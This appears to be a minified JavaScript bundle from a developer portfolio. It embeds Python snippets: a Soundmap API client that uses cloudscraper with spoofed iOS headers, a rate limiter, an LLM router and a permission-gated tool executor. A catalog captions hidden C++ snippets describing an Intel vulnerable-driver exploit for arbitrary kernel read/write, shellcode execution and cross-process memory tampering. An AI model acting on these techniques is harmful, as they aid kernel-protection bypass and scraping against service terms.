        if owner_id is None:
            owner_id = self.owner_id

        encoded = urllib.parse.quote(f'{{"0":{{"ownerId":"{owner_id}"}}}}')
        fetch_url = f"{self.API_BASE}{self.API_SONGS2}??batch=1&input={encoded}"

        retries = 3
        backoff_factor = 2

        for attempt in range(retries):
            try:
                socket.gethostbyname("api10.soundmap.dev")   # DNS sanity check

                resp = self.http.get(fetch_url, headers=self.headers)
                resp.raise_for_status()
                songs_data = resp.json()

                songs_by_rarity: dict[str, list] = {
                    "common": [], "uncommon": [], "rare": [],
                    "epic": [], "shiny": [], "other": [],
                }

                for song in songs_data["result"]["data"]["songs"]:
                    entry = {
                        "id":         song["id"],
                        "name":       song["name"],
                        "artist":     song["artist"],
                        "rarity":     song["rarity"],
                        "type":       song.get("type", "normal"),
                        "previewUrl": song.get("previewUrl", False),
                    }
                    if song.get("type") == "shiny":
                        songs_by_rarity["shiny"].append(entry)
                    elif song.get("type") == "mystic":
                        songs_by_rarity["epic"].append(entry)
                    elif song["rarity"] in songs_by_rarity:
                        songs_by_rarity[song["rarity"]].append(entry)
                    else:
                        songs_by_rarity["other"].append(entry)

                return songs_by_rarity

            except socket.gaierror as e:
                print(f"DNS resolution error: {e}")
            except requests.exceptions.RequestException as e:
                print(f"Error fetching songs (attempt {attempt + 1}): {e}")

            time.sleep(backoff_factor ** attempt)

        print("Failed to fetch songs after several attempts.")
        return None
`,Ph=`# soundmap_sign.py — Soundmap mobile API client: header construction and signing
# Source: 0xE666/Soundmap-API/soundmap.py

import cloudscraper
import json
from urllib.parse import urlencode
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter


class Soundmap:
    def __init__(self):
        self.authorization_token = "<REDACTED>"
        self.owner_id = "<REDACTED>"
        self.API_BASE = "https://api10.soundmap.dev"
        self.API_SONG  = "/trpc/song"
        self.API_SONGS2 = "/trpc/songs2"

        # Signed request headers — platform + version must match the iOS app
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Version": "1.57.0",
            "Authorization": self.authorization_token,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Platform": "ios",
            "User-Agent": "Mmap/650 CFNetwork/3826.400.120 Darwin/24.3.0",
            "Timezone": "America/Chicago",
        }

        self.retry_strategy = Retry(
            total=5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS"],
            backoff_factor=1,
        )

        self.http = cloudscraper.create_scraper()
        adapter = HTTPAdapter(max_retries=self.retry_strategy)
        self.http.mount("https://", adapter)
        self.http.mount("http://", adapter)

    def build_url_song(self, song_id: str) -> str:
        """Encode song lookup as a tRPC batch GET with nested JSON input."""
        params = {
            "batch": 1,
            "input": json.dumps({"0": {"id": song_id}}),
        }
        return f"{self.API_BASE}{self.API_SONG}?{urlencode(params)}"

    def search_song(self, song_id: str) -> dict | None:
        url = self.build_url_song(song_id)
        try:
            response = self.http.get(url, headers=self.headers)
            response.raise_for_status()
            data   = response.json()
            result = data[0]["result"]["data"]["song"]
            owner  = data[0]["result"]["data"]["owner"]

            return {
                "song_id":   result["id"],
                "song_name": result["name"],
                "coin_value": result["coinValue"],
                "artist":    result["artist"],
                "rarity":    result["rarity"],
                "owner_id":  result["ownerId"],
                "owner_username":        owner["username"],
                "owner_trades_completed": owner["tradesCompleted"],
            }
        except Exception as e:
            print(f"Error fetching song {song_id}: {e}")
            return None
`,Ih=`# trade_limit.py — token-bucket rate limiter with sliding-window backoff
# Source: 0xE666/path-of-exile-trade-api/poetrade/rate_limiter.py

from __future__ import annotations
import asyncio
from dataclasses import dataclass, field
from typing import Mapping


@dataclass
class RateRule:
    """One rate limit rule parsed from API response headers.

    Fields match the X-Rate-Limit-<policy> header format:
        max_hits : window : penalty
    """
    max_hits:         int
    window:           int
    penalty:          int
    current:          int   = 0
    penalty_remaining: float = 0.0


@dataclass
class PolicyState:
    """All rules for a single named rate-limit policy."""
    rules: list[RateRule] = field(default_factory=list)


class RateLimiter:
    """Parses GGG trade API rate-limit headers and enforces per-policy back-off."""

    def __init__(self):
        self._policies: dict[str, PolicyState] = {}

    def update(self, policy: str, headers: Mapping[str, str]) -> None:
        """Ingest X-Rate-Limit-* headers from a live response."""
        rules_header = headers.get("X-Rate-Limit-Rules", "")
        if not rules_header:
            return

        rule_names = [r.strip() for r in rules_header.split(",")]
        all_rules: list[RateRule] = []

        for rule_name in rule_names:
            limit_header = headers.get(f"X-Rate-Limit-{rule_name}", "")
            state_header = headers.get(f"X-Rate-Limit-{rule_name}-State", "")
            if not limit_header:
                continue

            limits = limit_header.split(",")
            states = state_header.split(",") if state_header else []

            for i, limit_str in enumerate(limits):
                parts = limit_str.strip().split(":")
                if len(parts) != 3:
                    continue
                max_hits, window, penalty = int(parts[0]), int(parts[1]), int(parts[2])
                current, penalty_remaining = 0, 0.0

                if i < len(states):
                    s = states[i].strip().split(":")
                    if len(s) == 3:
                        current           = int(s[0])
                        penalty_remaining = float(s[2])

                all_rules.append(RateRule(
                    max_hits=max_hits, window=window, penalty=penalty,
                    current=current, penalty_remaining=penalty_remaining,
                ))

        self._policies[policy] = PolicyState(rules=all_rules)

    def wait_time(self, policy: str) -> float:
        """Return seconds to wait before the next request under *policy*."""
        state = self._policies.get(policy)
        if state is None:
            return 0.0

        max_wait = 0.0
        for rule in state.rules:
            if rule.penalty_remaining > 0:
                max_wait = max(max_wait, rule.penalty_remaining)
            elif rule.current >= rule.max_hits - 1:
                # Within one hit of the cap — back off for the full window
                max_wait = max(max_wait, float(rule.window))
        return max_wait

    async def acquire(self, policy: str) -> None:
        """Async sleep until the policy window permits another request."""
        wait = self.wait_time(policy)
        if wait > 0:
            await asyncio.sleep(wait)

    def handle_429(self, headers: Mapping[str, str]) -> float:
        """Return the Retry-After delay (seconds) from a 429 response."""
        try:
            return float(headers.get("Retry-After", "60"))
        except ValueError:
            return 60.0
`,Lh=`# vaal_route.py — multi-provider LLM router with per-provider format normalisation
# Source: projects/air/vaal/core/providers.py + llm.py

from __future__ import annotations
from dataclasses import dataclass
from typing import Generator

import httpx


BUILTIN_PROVIDERS: dict[str, dict] = {
    "ollama": {
        "base_url": "http://localhost:11434",
        "requires_key": False,
        "chat_endpoint": "/api/chat",
        "format": "ollama",
    },
    "openai": {
        "base_url": "https://api.openai.com/v1",
        "requires_key": True,
        "key_env": "OPENAI_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
    "anthropic": {
        "base_url": "https://api.anthropic.com",
        "requires_key": True,
        "key_env": "ANTHROPIC_API_KEY",
        "chat_endpoint": "/v1/messages",
        "format": "anthropic",
    },
    "groq": {
        "base_url": "https://api.groq.com/openai/v1",
        "requires_key": True,
        "key_env": "GROQ_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
    "openrouter": {
        "base_url": "https://openrouter.ai/api/v1",
        "requires_key": True,
        "key_env": "OPENROUTER_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
    "deepseek": {
        "base_url": "https://api.deepseek.com/v1",
        "requires_key": True,
        "key_env": "DEEPSEEK_API_KEY",
        "chat_endpoint": "/chat/completions",
        "format": "openai",
    },
}

DEFAULT_MODELS: dict[str, str] = {
    "ollama":      "qwen3:8b",
    "openai":      "gpt-4o",
    "anthropic":   "claude-opus-4-6",
    "groq":        "llama-3.3-70b-versatile",
    "openrouter":  "anthropic/claude-sonnet-4",
    "deepseek":    "deepseek-chat",
}


def parse_model_string(model_str: str) -> tuple[str, str]:
    """Parse 'provider:model' into (provider, model_id).

    Falls back to ('ollama', model_str) when no known prefix is found,
    so bare Ollama model tags like 'qwen3:8b' route correctly.
    """
    for provider in BUILTIN_PROVIDERS:
        if model_str.startswith(f"{provider}:"):
            return provider, model_str[len(provider) + 1:]
    return "ollama", model_str


def chat_with_tools_stream(
    messages: list[dict],
    tools: list[dict],
    model: str = "qwen3:8b",
    think: bool = False,
    max_tokens: int = 8192,
) -> Generator[dict, None, None]:
    """Streaming chat with tool support.  Routes to the correct provider.
    Yields dicts with content / tool_calls / done keys."""
    provider, model_id = parse_model_string(model)

    # Cloud providers and capable local models both get generous output limits
    output_limit = max_tokens
    if provider in ("anthropic", "openai", "openrouter"):
        output_limit = 16384

    yield from stream_provider(
        provider_name=provider,
        model=model_id,
        messages=messages,
        tools=tools,
        max_tokens=output_limit,
        think=think,
    )
`,Dh=`# vaal_tooluse.py — streaming tool-use loop with permission gating and cancellation
# Source: projects/air/vaal/core/tool_executor.py + llm.py

from __future__ import annotations

from .hooks import load_hooks, run_hooks
from .permissions import PermissionManager
from .auto_fix import detect_bash_failure
from ..tools.registry import get_tool

_hooks = load_hooks()
_last_bash_failure: dict | None = None


def execute_tool(
    name: str,
    params: dict,
    permissions: PermissionManager,
    ask_fn=None,
) -> tuple[str, bool]:
    """Execute a single tool call.  Returns (result_text, was_executed).

    Permission ladder (first match wins):
      1. internet-blocked  — hard reject with hint
      2. deny list         — hard reject
      3. needs_approval    — prompt via ask_fn; remember if approved
      4. execute
    """
    global _last_bash_failure

    tool = get_tool(name)
    if tool is None:
        return f"[error: unknown tool '{name}']", False

    if permissions.is_internet_blocked(name):
        return (
            f"[tool '{name}' is blocked — internet access is disabled. "
            "Use /internet to re-enable.]",
            False,
        )

    if permissions.is_denied(name):
        return (
            f"[tool '{name}' is blocked by deny rule. "
            "Use /deny clear to remove deny rules.]",
            False,
        )

    if permissions.needs_approval(name):
        if ask_fn:
            approved = ask_fn(name, params)
            if not approved:
                return "[tool call denied by user]", False
            permissions.approve(name, remember=True)
        else:
            return "[tool requires approval but no ask function provided]", False

    # Auto-resolve relative paths so tools always receive absolute paths
    import os
    for path_key in ("file_path", "path"):
        if path_key in params and params[path_key]:
            p = str(params[path_key]).replace("\\\\", "/")
            if not os.path.isabs(p):
                params[path_key] = os.path.join(os.getcwd(), p).replace("\\\\", "/")

    pre_ctx = {"tool_name": name, "tool_params": str(params)}
    run_hooks("pre_tool", pre_ctx, _hooks)

    try:
        result   = tool.handler(**params)
        executed = True
    except Exception as e:
        result   = f"[tool error: {e}]"
        executed = False

    post_ctx = {
        "tool_name":    name,
        "tool_params":  str(params),
        "tool_result":  result,
        "tool_success": str(executed),
    }
    run_hooks("post_tool", post_ctx, _hooks)

    # Track bash failures for the auto-fix integration
    error_output = detect_bash_failure(name, result)
    _last_bash_failure = (
        {"command": params.get("command", ""), "error_output": error_output}
        if error_output is not None
        else None
    )

    return result, executed


def run_response_hooks(response_text: str) -> None:
    run_hooks("on_response", {"response": response_text}, _hooks)


def format_tool_result(name: str, result: str) -> str:
    if len(result) > 10_000:
        result = result[:10_000] + "\\n\\n[... output truncated]"
    return result
`,sr=[{id:"manual_map",projectId:"winint",file:"manual_map.cpp",lang:"cpp",lineStart:218,lineEnd:246,label:"iat-walk",caption:"IAT resolution: walk IMAGE_IMPORT_DESCRIPTOR, resolve ordinal+named thunks, patch via WriteProcessMemory"},{id:"sigscan",projectId:"winint",file:"sigscan.cpp",lang:"cpp",lineStart:88,lineEnd:122,label:"simd-scan",caption:"SIMD pattern scan with mask construction"},{id:"ioctl_dispatch",projectId:"winint",file:"ioctl_dispatch.c",lang:"c",lineStart:301,lineEnd:348,label:"irp-route",caption:"IRP_MJ dispatch table and IRP completion routine"},{id:"iat_patch",projectId:"winint",file:"iat_patch.cpp",lang:"cpp",lineStart:142,lineEnd:178,label:"iat-rewrite",caption:"Cross-process IAT rewrite with relocation table fixup"},{id:"intel_mmmap",projectId:"winint",file:"intel_exploit.cpp",lang:"cpp",lineStart:158,lineEnd:220,label:"mm-map-locked",caption:"Intel iqvw64e.sys exploit primitives: MmAllocatePagesForMdl + MmMapLockedPagesSpecifyCache + MmProtectMdlSystemAddress for kernel RWX without DSE bypass"},{id:"intel_mapio",projectId:"winint",file:"intel_exploit.cpp",lang:"cpp",lineStart:84,lineEnd:130,label:"mapio-rwx",caption:"Physical-address read/write via MapIoSpace — turns the Intel driver IOCTL into an arbitrary kernel R/W primitive"},{id:"kernel_resolver",projectId:"winint",file:"kernel_loader.cpp",lang:"cpp",lineStart:6,lineEnd:100,label:"export-resolve",caption:"PsLoadedModuleList walk + PE export-table resolution from usermode, used to bootstrap kernel-side function pointers without symbols"},{id:"kernel_init_user",projectId:"winint",file:"kernel_loader.cpp",lang:"cpp",lineStart:124,lineEnd:184,label:"init-usercode",caption:"InitializeUserCode: usermode shellcode marshaling and kernel-side execution context setup"},{id:"page_walk",projectId:"winint",file:"page_walk.cpp",lang:"cpp",lineStart:38,lineEnd:175,label:"pte-walk",caption:"Manual 4-level page-table walk (PML4 → PDPT → PD → PT) — checks present/large-page/2MB/1GB at every level"},{id:"page_protect_check",projectId:"winint",file:"page_walk.cpp",lang:"cpp",lineStart:244,lineEnd:290,label:"pte-rwx",caption:"IsPageReadable / IsPageWriteable / IsPageExecuteable — read PTE.NX bit and check W bit + ring level for the target VA"},{id:"drv_entry",projectId:"winint",file:"drv_entry.cpp",lang:"cpp",lineStart:257,lineEnd:360,label:"driver-entry",caption:"DriverEntry: register IRP handlers, allocate device, ExInitializeFastMutex on the control table, hand-off to DriverDispatch"},{id:"drv_ift_probe",projectId:"winint",file:"drv_entry.cpp",lang:"cpp",lineStart:173,lineEnd:215,label:"ift-probe",caption:"TestInvertedFunctionTable: walk PsInvertedFunctionTable to confirm SEH unwind metadata is registered for the loaded driver image"},{id:"mm_section_map",projectId:"winint",file:"mm_map_section.cpp",lang:"cpp",lineStart:42,lineEnd:105,label:"section-copy",caption:"MapImageSection: walk IMAGE_SECTION_HEADER table, RtlCopyMemory each section to its VirtualAddress with SizeOfRawData"},{id:"mm_reloc",projectId:"winint",file:"mm_map_section.cpp",lang:"cpp",lineStart:91,lineEnd:175,label:"reloc-fixup",caption:"MapImageRelocation: walk IMAGE_BASE_RELOCATION blocks, apply IMAGE_REL_BASED_DIR64 deltas to rebase the image to its mapped address"},{id:"mm_imports",projectId:"winint",file:"mm_map_section.cpp",lang:"cpp",lineStart:326,lineEnd:408,label:"import-resolve",caption:"MapImageImportDescriptor: walk import descriptors, LoadLibrary each, GetProcAddress each thunk, patch the IAT in-place"},{id:"mem_read",projectId:"winint",file:"mem_dispatch.cpp",lang:"cpp",lineStart:7,lineEnd:90,label:"mem-read",caption:"OnUserMemoryRead: PsLookupProcessByProcessId → KeStackAttachProcess → MmCopyVirtualMemory with probed source range"},{id:"mem_protect",projectId:"winint",file:"mem_dispatch.cpp",lang:"cpp",lineStart:142,lineEnd:200,label:"mem-protect",caption:"OnUserMemoryProtect: ZwProtectVirtualMemory cross-process with PAGE_EXECUTE_READWRITE; the protect/unprotect dance for hot patching"},{id:"irp_dispatch",projectId:"winint",file:"mem_dispatch.cpp",lang:"cpp",lineStart:198,lineEnd:360,label:"irp-router",caption:"DispatchDeviceControl: probe IRP buffers, fan-out to per-control handlers (Read/Write/Query/Protect/MemoryCommit/MemoryFree)"},{id:"soundmap_sign",projectId:"soundmap",file:"soundmap_sign.py",lang:"python",lineStart:42,lineEnd:78,label:"hmac-chain",caption:"Multi-stage HMAC-chain that signs Soundmap mobile API requests"},{id:"soundmap_request",projectId:"soundmap",file:"soundmap_request.py",lang:"python",lineStart:88,lineEnd:124,label:"request-flow",caption:"Authenticated request flow with retry + token refresh"},{id:"poe_null_scene",projectId:"poe_null",file:"poe_null_scene.cs",lang:"csharp",lineStart:174,lineEnd:218,label:"game-state",caption:"Real-time game-state diff over the PoE2 ECS"},{id:"trade_limit",projectId:"trade_api",file:"trade_limit.py",lang:"python",lineStart:118,lineEnd:156,label:"token-bucket",caption:"Token-bucket limiter with sliding-window backoff"},{id:"poe_watcher_detect",projectId:"poe_watcher",file:"poe_watcher_detect.py",lang:"python",lineStart:33,lineEnd:68,label:"foreground-detect",caption:"Foreground-window detection with PoE1 vs PoE2 disambiguation"},{id:"vaal_route",projectId:"vaal",file:"vaal_route.py",lang:"python",lineStart:60,lineEnd:102,label:"model-routing",caption:"Model-router across Ollama and cloud providers with tool-use fan-out"},{id:"vaal_tooluse",projectId:"vaal",file:"vaal_tooluse.py",lang:"python",lineStart:140,lineEnd:176,label:"tool-use",caption:"Streaming tool-use loop with cancellation"},{id:"minabot_cog",projectId:"minabot",file:"minabot_cog.py",lang:"python",lineStart:212,lineEnd:254,label:"cog-loader",caption:"Hot-reloading cog plugin loader"},{id:"pentest_plugin",projectId:"pentest",file:"pentest_plugin.py",lang:"python",lineStart:88,lineEnd:134,label:"plugin-pipeline",caption:"Plugin pipeline with payload composition"},{id:"crypto_backtest",projectId:"crypto",file:"crypto_backtest.py",lang:"python",lineStart:144,lineEnd:186,label:"backtest-loop",caption:"Vectorized backtest with PnL and drawdown reporting"},{id:"poe_ml_train",projectId:"poe_ml",file:"poe_ml_train.py",lang:"python",lineStart:60,lineEnd:96,label:"train-loop",caption:"Training loop with mixed-precision + grad accumulation"}],Nh=Object.assign({"../snippets/crypto_backtest.py":fh,"../snippets/drv_entry.cpp":hh,"../snippets/iat_patch.cpp":mh,"../snippets/intel_exploit.cpp":_h,"../snippets/ioctl_dispatch.c":gh,"../snippets/kernel_loader.cpp":vh,"../snippets/manual_map.cpp":xh,"../snippets/mem_dispatch.cpp":Eh,"../snippets/minabot_cog.py":yh,"../snippets/mm_map_section.cpp":Mh,"../snippets/page_walk.cpp":Sh,"../snippets/pentest_plugin.py":bh,"../snippets/poe_ml_train.py":Th,"../snippets/poe_null_scene.cs":Ah,"../snippets/poe_watcher_detect.py":Rh,"../snippets/sigscan.cpp":wh,"../snippets/soundmap_request.py":Ch,"../snippets/soundmap_sign.py":Ph,"../snippets/trade_limit.py":Ih,"../snippets/vaal_route.py":Lh,"../snippets/vaal_tooluse.py":Dh});function Uh(i){const t=Object.entries(Nh).find(([e])=>e.endsWith("/"+i));return t?t[1]:null}const Vr=1600,Wr=900,Oh=6,Fh=10,kh=10.6,Xr=10414591;function Bh(i){const t=new Map;for(const s of sr)t.has(s.projectId)||t.set(s.projectId,[]),t.get(s.projectId).push(s);const e=new Map;i.nodes.forEach(s=>{s.knotId&&(e.has(s.knotId)||e.set(s.knotId,[]),e.get(s.knotId).push(s))});const n=[],r=[];for(const[s,o]of t){const a=i.knots.find(p=>p.id===s);if(!a)continue;const l=e.get(a.id)??[];if(!l.length)continue;const c=a.x-Vr/2,u=-(a.y-Wr/2),h=[...l].map(p=>{const m=p.x-Vr/2,E=-(p.y-Wr/2),x=(m-c)**2+(E-u)**2+p.z**2;return{n:p,d:x}}).sort((p,m)=>m.d-p.d).map(p=>p.n);for(let p=0;p<o.length;p++){const m=h[p%h.length];n.push(new L(m.x-Vr/2,-(m.y-Wr/2),m.z)),r.push(o[p])}}return{pos:n,anchors:r}}function zh(i){const{pos:t,anchors:e}=Bh(i),n=new ps(Oh,14,12),r=new pi({color:Xr}),s=new Gr(n,r,Math.max(1,t.length));s.frustumCulled=!1;const o=new tr(Fh,kh,40),a=new pi({color:Xr,transparent:!0,opacity:.7,side:Oe}),l=new Gr(o,a,Math.max(1,t.length));l.frustumCulled=!1;const c=new tr(14,16,40),u=new pi({color:Xr,transparent:!0,opacity:.18,side:Oe}),h=new Gr(c,u,Math.max(1,t.length));h.frustumCulled=!1;const p=new Zt;for(let m=0;m<t.length;m++)p.identity(),p.setPosition(t[m]),s.setMatrixAt(m,p),l.setMatrixAt(m,p),h.setMatrixAt(m,p);return s.instanceMatrix.needsUpdate=!0,l.instanceMatrix.needsUpdate=!0,h.instanceMatrix.needsUpdate=!0,{pinDots:s,pinRings:l,pinHalos:h,pinPositions:t,pinAnchors:e}}function Gh(i,t,e){const n=new Zt,r=t*.6,s=1+.18*Math.sin(t*1.4),o=1+.08*Math.sin(t*2.2);for(let a=0;a<i.pinPositions.length;a++){const l=i.pinPositions[a],c=a===e,u=(c?1.45:1)*o;n.makeScale(u,u,u),n.setPosition(l.x,l.y,l.z),i.pinDots.setMatrixAt(a,n);const h=c?1.25:1;n.makeRotationZ(r),n.scale(new L(h,h,h)),n.setPosition(l.x,l.y,l.z),i.pinRings.setMatrixAt(a,n);const p=(c?1.4:1)*s;n.makeRotationZ(-r*.5),n.scale(new L(p,p,p)),n.setPosition(l.x,l.y,l.z),i.pinHalos.setMatrixAt(a,n)}i.pinDots.instanceMatrix.needsUpdate=!0,i.pinRings.instanceMatrix.needsUpdate=!0,i.pinHalos.instanceMatrix.needsUpdate=!0}function Hh(i,t,e,n){const r=new Lo,s=new zt;let o=null;const a=l=>{const c=i.getBoundingClientRect();s.x=(l.clientX-c.left)/c.width*2-1,s.y=-((l.clientY-c.top)/c.height)*2+1,r.setFromCamera(s,t);const u=r.intersectObject(e.pinDots,!1);let h=null;if(u.length){const p=u[0].instanceId;typeof p=="number"&&p<e.pinAnchors.length&&(h=p)}h!==o?(o=h,n({pin:h===null?null:e.pinAnchors[h],index:h,clientX:l.clientX,clientY:l.clientY})):h!==null&&n({pin:e.pinAnchors[h],index:h,clientX:l.clientX,clientY:l.clientY})};return i.addEventListener("pointermove",a),()=>i.removeEventListener("pointermove",a)}var Ja=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function Vh(i){return i&&i.__esModule&&Object.prototype.hasOwnProperty.call(i,"default")?i.default:i}var Uo={exports:{}};(function(i){var t=typeof window<"u"?window:typeof WorkerGlobalScope<"u"&&self instanceof WorkerGlobalScope?self:{};/**
 * Prism: Lightweight, robust, elegant syntax highlighting
 *
 * @license MIT <https://opensource.org/licenses/MIT>
 * @author Lea Verou <https://lea.verou.me>
 * @namespace
 * @public
 */var e=function(n){var r=/(?:^|\s)lang(?:uage)?-([\w-]+)(?=\s|$)/i,s=0,o={},a={manual:n.Prism&&n.Prism.manual,disableWorkerMessageHandler:n.Prism&&n.Prism.disableWorkerMessageHandler,util:{encode:function g(_){return _ instanceof l?new l(_.type,g(_.content),_.alias):Array.isArray(_)?_.map(g):_.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/\u00a0/g," ")},type:function(g){return Object.prototype.toString.call(g).slice(8,-1)},objId:function(g){return g.__id||Object.defineProperty(g,"__id",{value:++s}),g.__id},clone:function g(_,v){v=v||{};var w,S;switch(a.util.type(_)){case"Object":if(S=a.util.objId(_),v[S])return v[S];w={},v[S]=w;for(var T in _)_.hasOwnProperty(T)&&(w[T]=g(_[T],v));return w;case"Array":return S=a.util.objId(_),v[S]?v[S]:(w=[],v[S]=w,_.forEach(function(D,y){w[y]=g(D,v)}),w);default:return _}},getLanguage:function(g){for(;g;){var _=r.exec(g.className);if(_)return _[1].toLowerCase();g=g.parentElement}return"none"},setLanguage:function(g,_){g.className=g.className.replace(RegExp(r,"gi"),""),g.classList.add("language-"+_)},currentScript:function(){if(typeof document>"u")return null;if(document.currentScript&&document.currentScript.tagName==="SCRIPT")return document.currentScript;try{throw new Error}catch(w){var g=(/at [^(\r\n]*\((.*):[^:]+:[^:]+\)$/i.exec(w.stack)||[])[1];if(g){var _=document.getElementsByTagName("script");for(var v in _)if(_[v].src==g)return _[v]}return null}},isActive:function(g,_,v){for(var w="no-"+_;g;){var S=g.classList;if(S.contains(_))return!0;if(S.contains(w))return!1;g=g.parentElement}return!!v}},languages:{plain:o,plaintext:o,text:o,txt:o,extend:function(g,_){var v=a.util.clone(a.languages[g]);for(var w in _)v[w]=_[w];return v},insertBefore:function(g,_,v,w){w=w||a.languages;var S=w[g],T={};for(var D in S)if(S.hasOwnProperty(D)){if(D==_)for(var y in v)v.hasOwnProperty(y)&&(T[y]=v[y]);v.hasOwnProperty(D)||(T[D]=S[D])}var R=w[g];return w[g]=T,a.languages.DFS(a.languages,function(k,X){X===R&&k!=g&&(this[k]=T)}),T},DFS:function g(_,v,w,S){S=S||{};var T=a.util.objId;for(var D in _)if(_.hasOwnProperty(D)){v.call(_,D,_[D],w||D);var y=_[D],R=a.util.type(y);R==="Object"&&!S[T(y)]?(S[T(y)]=!0,g(y,v,null,S)):R==="Array"&&!S[T(y)]&&(S[T(y)]=!0,g(y,v,D,S))}}},plugins:{},highlightAll:function(g,_){a.highlightAllUnder(document,g,_)},highlightAllUnder:function(g,_,v){var w={callback:v,container:g,selector:'code[class*="language-"], [class*="language-"] code, code[class*="lang-"], [class*="lang-"] code'};a.hooks.run("before-highlightall",w),w.elements=Array.prototype.slice.apply(w.container.querySelectorAll(w.selector)),a.hooks.run("before-all-elements-highlight",w);for(var S=0,T;T=w.elements[S++];)a.highlightElement(T,_===!0,w.callback)},highlightElement:function(g,_,v){var w=a.util.getLanguage(g),S=a.languages[w];a.util.setLanguage(g,w);var T=g.parentElement;T&&T.nodeName.toLowerCase()==="pre"&&a.util.setLanguage(T,w);var D=g.textContent,y={element:g,language:w,grammar:S,code:D};function R(X){y.highlightedCode=X,a.hooks.run("before-insert",y),y.element.innerHTML=y.highlightedCode,a.hooks.run("after-highlight",y),a.hooks.run("complete",y),v&&v.call(y.element)}if(a.hooks.run("before-sanity-check",y),T=y.element.parentElement,T&&T.nodeName.toLowerCase()==="pre"&&!T.hasAttribute("tabindex")&&T.setAttribute("tabindex","0"),!y.code){a.hooks.run("complete",y),v&&v.call(y.element);return}if(a.hooks.run("before-highlight",y),!y.grammar){R(a.util.encode(y.code));return}if(_&&n.Worker){var k=new Worker(a.filename);k.onmessage=function(X){R(X.data)},k.postMessage(JSON.stringify({language:y.language,code:y.code,immediateClose:!0}))}else R(a.highlight(y.code,y.grammar,y.language))},highlight:function(g,_,v){var w={code:g,grammar:_,language:v};if(a.hooks.run("before-tokenize",w),!w.grammar)throw new Error('The language "'+w.language+'" has no grammar.');return w.tokens=a.tokenize(w.code,w.grammar),a.hooks.run("after-tokenize",w),l.stringify(a.util.encode(w.tokens),w.language)},tokenize:function(g,_){var v=_.rest;if(v){for(var w in v)_[w]=v[w];delete _.rest}var S=new h;return p(S,S.head,g),u(g,S,_,S.head,0),E(S)},hooks:{all:{},add:function(g,_){var v=a.hooks.all;v[g]=v[g]||[],v[g].push(_)},run:function(g,_){var v=a.hooks.all[g];if(!(!v||!v.length))for(var w=0,S;S=v[w++];)S(_)}},Token:l};n.Prism=a;function l(g,_,v,w){this.type=g,this.content=_,this.alias=v,this.length=(w||"").length|0}l.stringify=function g(_,v){if(typeof _=="string")return _;if(Array.isArray(_)){var w="";return _.forEach(function(R){w+=g(R,v)}),w}var S={type:_.type,content:g(_.content,v),tag:"span",classes:["token",_.type],attributes:{},language:v},T=_.alias;T&&(Array.isArray(T)?Array.prototype.push.apply(S.classes,T):S.classes.push(T)),a.hooks.run("wrap",S);var D="";for(var y in S.attributes)D+=" "+y+'="'+(S.attributes[y]||"").replace(/"/g,"&quot;")+'"';return"<"+S.tag+' class="'+S.classes.join(" ")+'"'+D+">"+S.content+"</"+S.tag+">"};function c(g,_,v,w){g.lastIndex=_;var S=g.exec(v);if(S&&w&&S[1]){var T=S[1].length;S.index+=T,S[0]=S[0].slice(T)}return S}function u(g,_,v,w,S,T){for(var D in v)if(!(!v.hasOwnProperty(D)||!v[D])){var y=v[D];y=Array.isArray(y)?y:[y];for(var R=0;R<y.length;++R){if(T&&T.cause==D+","+R)return;var k=y[R],X=k.inside,et=!!k.lookbehind,P=!!k.greedy,B=k.alias;if(P&&!k.pattern.global){var W=k.pattern.toString().match(/[imsuy]*$/)[0];k.pattern=RegExp(k.pattern.source,W+"g")}for(var Y=k.pattern||k,H=w.next,V=S;H!==_.tail&&!(T&&V>=T.reach);V+=H.value.length,H=H.next){var q=H.value;if(_.length>g.length)return;if(!(q instanceof l)){var J=1,K;if(P){if(K=c(Y,V,g,et),!K||K.index>=g.length)break;var pt=K.index,G=K.index+K[0].length,j=V;for(j+=H.value.length;pt>=j;)H=H.next,j+=H.value.length;if(j-=H.value.length,V=j,H.value instanceof l)continue;for(var rt=H;rt!==_.tail&&(j<G||typeof rt.value=="string");rt=rt.next)J++,j+=rt.value.length;J--,q=g.slice(V,j),K.index-=V}else if(K=c(Y,0,q,et),!K)continue;var pt=K.index,ut=K[0],St=q.slice(0,pt),Tt=q.slice(pt+ut.length),gt=V+q.length;T&&gt>T.reach&&(T.reach=gt);var Ut=H.prev;St&&(Ut=p(_,Ut,St),V+=St.length),m(_,Ut,J);var N=new l(D,X?a.tokenize(ut,X):ut,B,ut);if(H=p(_,Ut,N),Tt&&p(_,H,Tt),J>1){var ne={cause:D+","+R,reach:gt};u(g,_,v,H.prev,V,ne),T&&ne.reach>T.reach&&(T.reach=ne.reach)}}}}}}function h(){var g={value:null,prev:null,next:null},_={value:null,prev:g,next:null};g.next=_,this.head=g,this.tail=_,this.length=0}function p(g,_,v){var w=_.next,S={value:v,prev:_,next:w};return _.next=S,w.prev=S,g.length++,S}function m(g,_,v){for(var w=_.next,S=0;S<v&&w!==g.tail;S++)w=w.next;_.next=w,w.prev=_,g.length-=S}function E(g){for(var _=[],v=g.head.next;v!==g.tail;)_.push(v.value),v=v.next;return _}if(!n.document)return n.addEventListener&&(a.disableWorkerMessageHandler||n.addEventListener("message",function(g){var _=JSON.parse(g.data),v=_.language,w=_.code,S=_.immediateClose;n.postMessage(a.highlight(w,a.languages[v],v)),S&&n.close()},!1)),a;var x=a.util.currentScript();x&&(a.filename=x.src,x.hasAttribute("data-manual")&&(a.manual=!0));function f(){a.manual||a.highlightAll()}if(!a.manual){var d=document.readyState;d==="loading"||d==="interactive"&&x&&x.defer?document.addEventListener("DOMContentLoaded",f):window.requestAnimationFrame?window.requestAnimationFrame(f):window.setTimeout(f,16)}return a}(t);i.exports&&(i.exports=e),typeof 